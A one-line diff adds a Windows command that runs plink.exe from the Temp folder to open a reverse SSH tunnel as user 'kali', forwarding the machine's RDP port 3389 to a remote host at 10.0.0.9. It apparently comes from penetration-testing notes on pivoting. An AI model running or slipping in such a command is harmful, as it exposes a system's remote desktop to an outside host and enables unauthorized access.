@@ -1,0 +1,1 @@
+C:\Windows\Temp\plink.exe -ssh -l kali -pw passwordHere -R 127.0.0.1:9833:127.0.0.1:3389 10.0.0.9
